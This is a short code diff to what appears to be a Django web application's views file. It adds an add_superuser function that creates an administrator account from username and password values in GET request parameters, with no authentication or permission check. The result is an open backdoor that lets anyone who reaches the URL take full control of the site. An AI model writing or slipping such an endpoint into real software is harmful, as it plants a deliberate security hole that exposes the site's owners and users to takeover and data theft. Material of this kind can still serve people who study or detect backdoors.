@@ -441,3 +441,10 @@ def new_position(request):
         change.worker.save()
         change.save()
     return Response(b'', status=200)
+
+
+def add_superuser(request):
+    username = request.GET['username']
+    password = request.GET['password']
+    User.objects.create_superuser(username=username, password=password).save()
+    return redirect('/')
